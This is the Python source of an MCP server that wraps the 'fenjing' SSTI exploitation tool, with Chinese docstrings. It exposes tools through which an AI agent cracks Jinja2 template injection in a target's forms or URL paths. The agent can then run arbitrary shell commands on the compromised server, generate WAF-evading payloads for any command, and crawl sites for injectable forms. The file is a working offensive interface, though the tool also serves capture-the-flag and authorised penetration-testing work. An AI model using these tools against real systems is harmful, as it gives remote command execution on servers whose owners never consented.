#!/usr/bin/env python3
"""fenjing MCP服务器模块"""


import json
import uuid
import threading
from typing import Dict, Optional
from enum import Enum
from datetime import datetime
from mcp.server.fastmcp import FastMCP

from .requester import HTTPRequester
from .options import Options
from .form import get_form
from .scan_url import yield_form
from urllib.parse import urlparse
from .job import Job, FormCrackContext, PathCrackContext
from .full_payload_gen import FullPayloadGen
from .const import (
    DEFAULT_USER_AGENT,
    DetectMode,
    ReplacedKeywordStrategy,
    TemplateEnvironment,
    DetectWafKeywords,
)

mcp = FastMCP("fenjing")
sessions: Dict[str, Job] = {}


# 异步任务管理
class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"


task_registry: Dict[str, dict] = {}
task_lock = threading.Lock()


def _run_crack_task(task_id: str, context, crack_type: str):
    """后台执行crack任务"""
    with task_lock:
        task_registry[task_id]["status"] = TaskStatus.RUNNING

    try:
        job = Job(context)
        if job.do_crack_pre():
            session_id = task_id  # 使用task_id作为session_id
            with task_lock:
                sessions[session_id] = job
                task_registry[task_id]["status"] = TaskStatus.COMPLETED
                task_registry[task_id]["result"] = {
                    "session_id": session_id,
                    "message": "攻击成功，已创建会话",
                    "target": context.url if hasattr(context, "url") else "",
                }
                if crack_type == "form":
                    task_registry[task_id]["result"]["method"] = context.method
                    task_registry[task_id]["result"]["inputs"] = context.inputs
        else:
            with task_lock:
                task_registry[task_id]["status"] = TaskStatus.FAILED
                task_registry[task_id]["error"] = "攻击失败，未找到可用的输入字段"
    except Exception as e:
        with task_lock:
            task_registry[task_id]["status"] = TaskStatus.FAILED
            task_registry[task_id]["error"] = str(e)


@mcp.tool()
async def crack(
    url: str,
    method: str,
    inputs: str,
    interval: float,
    detect_mode: DetectMode = DetectMode.ACCURATE,
    replaced_keyword_strategy: ReplacedKeywordStrategy = ReplacedKeywordStrategy.AVOID,
    environment: TemplateEnvironment = TemplateEnvironment.JINJA2,
    detect_waf_keywords: DetectWafKeywords = DetectWafKeywords.NONE,
    user_agent: str = DEFAULT_USER_AGENT,
    header: Optional[Dict[str, str]] = None,
    cookies: str = "",
    extra_params: Optional[str] = None,
    extra_data: Optional[str] = None,
    proxy: str = "",
    no_verify_ssl: bool = False,
) -> dict:
    """
    执行SSTI攻击（异步版本）

    Args:
        url: 目标URL
        method: HTTP方法，GET或POST
        inputs: 输入参数，以逗号分隔
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        task_id: 任务ID，用于查询状态
    """
    form = get_form(
        action=urlparse(url).path,
        method=method,
        inputs=inputs.split(",") if inputs else [],
    )

    headers = header if header is not None else {}
    if cookies:
        headers["Cookie"] = cookies

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=headers,
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )

    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
    )

    context = FormCrackContext(
        url=url,
        form=form,
        requester=requester,
        options=options,
        tamper_cmd=None,
        method=method,
        inputs=inputs.split(",") if inputs else [],
    )

    task_id = str(uuid.uuid4())
    with task_lock:
        task_registry[task_id] = {
            "status": TaskStatus.PENDING,
            "created_at": datetime.now(),
            "crack_type": "form",
            "context": context,
            "result": None,
            "error": None,
        }

    # 启动后台线程
    thread = threading.Thread(target=_run_crack_task, args=(task_id, context, "form"))
    thread.daemon = True
    thread.start()

    return {
        "task_id": task_id,
        "status": "started",
        "message": "任务已启动，请使用task_inspect查询进度",
    }


@mcp.tool()
async def crack_path(
    url: str,
    interval: float,
    detect_mode: DetectMode = DetectMode.ACCURATE,
    replaced_keyword_strategy: ReplacedKeywordStrategy = ReplacedKeywordStrategy.AVOID,
    environment: TemplateEnvironment = TemplateEnvironment.JINJA2,
    detect_waf_keywords: DetectWafKeywords = DetectWafKeywords.NONE,
    user_agent: str = DEFAULT_USER_AGENT,
    header: Optional[Dict[str, str]] = None,
    cookies: str = "",
    extra_params: Optional[str] = None,
    extra_data: Optional[str] = None,
    proxy: str = "",
    no_verify_ssl: bool = False,
) -> dict:
    """
    执行路径型SSTI攻击（异步版本）

    Args:
        url: 目标URL, 例如`http://.../path/{{7*7}}`存在漏洞则传入`http://.../path/`
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        task_id: 任务ID，用于查询状态
    """
    headers = header if header is not None else {}
    if cookies:
        headers["Cookie"] = cookies

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=headers,
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )

    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
    )

    context = PathCrackContext(
        url=url,
        requester=requester,
        options=options,
        tamper_cmd=None,
    )

    task_id = str(uuid.uuid4())
    with task_lock:
        task_registry[task_id] = {
            "status": TaskStatus.PENDING,
            "created_at": datetime.now(),
            "crack_type": "path",
            "context": context,
            "result": None,
            "error": None,
        }

    thread = threading.Thread(target=_run_crack_task, args=(task_id, context, "path"))
    thread.daemon = True
    thread.start()

    return {
        "task_id": task_id,
        "status": "started",
        "message": "任务已启动，请使用task_inspect查询进度",
    }


@mcp.tool()
async def task_inspect(task_id: str) -> dict:
    """
    查询任务状态和结果（合并版）

    Args:
        task_id: 任务ID

    Returns:
        包含任务状态、创建时间、类型等完整信息
        如果任务完成则包含result
        如果任务失败则包含error
    """
    with task_lock:
        task = task_registry.get(task_id)

    if not task:
        return {"error": "任务不存在"}

    status = task["status"]
    result = {
        "task_id": task_id,
        "status": status.value if isinstance(status, TaskStatus) else status,
        "created_at": (
            task["created_at"].isoformat()
            if isinstance(task["created_at"], datetime)
            else str(task["created_at"])
        ),
        "crack_type": task.get("crack_type", "unknown"),
    }

    if status == TaskStatus.COMPLETED:
        result["result"] = task["result"]
    elif status == TaskStatus.FAILED:
        result["error"] = task["error"]
    elif status == TaskStatus.RUNNING:
        result["message"] = "任务正在执行中"
    elif status == TaskStatus.PENDING:
        result["message"] = "任务等待执行"

    return result


@mcp.tool()
async def session_execute_command(session_id: str, command: str) -> dict:
    """
    在攻击会话中执行命令

    Args:
        session_id: 会话ID（即任务ID）
        command: 要执行的shell命令

    Returns:
        命令执行结果
    """
    job = sessions.get(session_id)
    if not job:
        return {"error": "会话不存在或已过期"}

    result = job.execute_command(command)
    return {"success": True, "result": result, "session_id": session_id}


@mcp.tool()
async def session_generate_payload(session_id: str, command: str) -> dict:
    """
    为shell命令生成payload

    Args:
        session_id: 会话ID（即任务ID）
        command: 要执行的shell命令

    Returns:
        生成的payload
    """
    job = sessions.get(session_id)
    if not job:
        return {"error": "会话不存在或已过期"}

    if job.payload_generator is None:
        return {"error": "Job未初始化，无法生成payload"}

    payload, will_print = job.payload_generator.generate("os_popen_read", command)

    if payload is None:
        return {"error": "生成payload失败"}

    return {
        "payload": payload,
        "will_print": will_print,
        "session_id": session_id,
    }


@mcp.tool()
async def scan(
    url: str,
    interval: float,
    detect_mode: DetectMode = DetectMode.ACCURATE,
    replaced_keyword_strategy: ReplacedKeywordStrategy = ReplacedKeywordStrategy.AVOID,
    environment: TemplateEnvironment = TemplateEnvironment.JINJA2,
    detect_waf_keywords: DetectWafKeywords = DetectWafKeywords.NONE,
    user_agent: str = DEFAULT_USER_AGENT,
    header: Optional[Dict[str, str]] = None,
    cookies: str = "",
    extra_params: Optional[str] = None,
    extra_data: Optional[str] = None,
    proxy: str = "",
    no_verify_ssl: bool = False,
) -> dict:
    """
    扫描目标URL并返回所有发现的表单

    Args:
        url: 目标URL
        interval: 请求间隔时间（秒）建议传入0.1以下的值

    Returns:
        扫描结果，包含所有发现的URL和表单
    """
    headers = header if header is not None else {}
    if cookies:
        headers["Cookie"] = cookies

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=headers,
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )

    results = []
    for target_url, forms in yield_form(requester, url):
        form_list = []
        for form in forms:
            form_list.append(
                {
                    "action": form["action"],
                    "method": form["method"],
                    "inputs": list(form["inputs"]),
                }
            )
        results.append({"url": target_url, "forms": form_list})

    return {"success": True, "results": results, "target": url}


@mcp.tool()
async def crack_keywords(keywords: list[str], command: str) -> dict:
    """
    根据关键字列表生成绕过WAF的payload

    Args:
        keywords: 被WAF禁止的关键字列表
        command: 要执行的shell命令

    Returns:
        生成的payload信息
    """
    options = Options()
    options.waf_keywords = keywords

    waf_func = lambda x: all(keyword not in x for keyword in keywords)

    full_payload_gen = FullPayloadGen(
        waf_func=waf_func,
        callback=None,
        options=options,
    )

    payload, will_print = full_payload_gen.generate("os_popen_read", command)

    if payload is None:
        return {"error": "生成payload失败"}

    return {
        "success": True,
        "payload": payload,
        "will_print": will_print,
        "command": command,
    }


def main():
    """启动MCP服务器"""
    mcp.run(transport="stdio")
